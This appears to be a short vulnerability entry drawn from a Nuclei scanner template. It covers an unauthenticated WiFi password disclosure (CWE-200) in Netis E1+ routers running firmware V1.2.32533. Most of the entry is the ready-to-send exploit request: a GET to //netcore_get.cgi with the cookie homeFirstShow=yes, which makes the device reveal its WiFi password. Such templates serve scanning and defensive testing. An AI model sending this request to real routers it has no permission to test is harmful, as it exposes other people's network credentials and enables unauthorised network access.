# Vulnerability: Netis E1+ V1.2.32533 - WiFi Password Disclosure
**Classification:** CWE-200
**Source:** Nuclei Template (`netis-info-leak.yaml`)

## Description
A vulnerability in Netis allows remote unauthenticated users to disclose the WiFi password of the remote device.

## Vulnerable Code Pattern / Exploit Payload
```http
GET //netcore_get.cgi HTTP/1.1
Host: {{Hostname}}
Cookie: homeFirstShow=yes
```

